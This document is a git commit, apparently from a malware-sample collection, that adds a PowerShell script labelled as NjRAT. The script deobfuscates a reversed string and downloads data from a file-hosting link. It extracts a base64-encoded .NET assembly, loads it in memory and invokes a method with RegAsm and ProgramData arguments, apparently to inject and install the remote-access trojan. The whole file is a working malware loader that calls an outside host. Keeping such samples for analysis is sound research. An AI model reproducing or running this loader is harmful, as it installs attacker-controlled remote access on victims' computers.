ec2b19b31e729966c533de6e5f863e55e4addcf1
D1M1S3 <NET406@outlook.com>
2025-04-18 23:20:14 -0800

    NjRAT
    Analyze With Caution

---
+++ ac6a57a84f3b91fad6c7958193c9b27b3b45730f436365564a25c27fda6cf367/payload/payload/payload.ps1
@@ -0,0 +1,16 @@
+# From[SHA256]: 2639beb6868a10b9189f2717920a790a2314dbda28865a145de49fe0008006b2
+$dendritiform = '0/ZMDah6nZ/d/ee.e#sap//:sp##h';
+$didus = $dendritiform -replace '#', 't';
+$ravenry = 'https://3006.filemail.com/api/file/get?filekey=9SWpQC42SMfvrHfN8H3HN01M4GTcgabefIP8DVp_85lm0oU3IYzvHL3Pz68IIHw&skipreg=true&pk_vid=7bdc4b0bee39cf1d1743452872b78eb1';$vetter = New-Object System.Net.WebClient;$paletots = $vetter.DownloadData($ravenry);
+$subjunctive = [System.Text.Encoding]::UTF8.GetString($paletots);
+$distractious = '<<BASE64_START>>';
+$tinned = '<<BASE64_END>>';
+$stephanial = $subjunctive.IndexOf($distractious);
+$nihilianism = $subjunctive.IndexOf($tinned);
+$stephanial -ge 0 -and $nihilianism -gt $stephanial;
+$stephanial += $distractious.Length;
+$bioaccumulation = $nihilianism - $stephanial;
+$gremlins = $subjunctive.Substring($stephanial, $bioaccumulation);
+$uncannily = [System.Convert]::FromBase64String($gremlins);
+$otiorhynchine = [System.Reflection.Assembly]::Load($uncannily);
+$kitmutgar = [dnlib.IO.Home].GetMethod('VAI').Invoke($null, [object[]] @($didus,'','','','RegAsm','','','','','C:\ProgramData\','impartir','js','1','1','coolnesses','2',''))
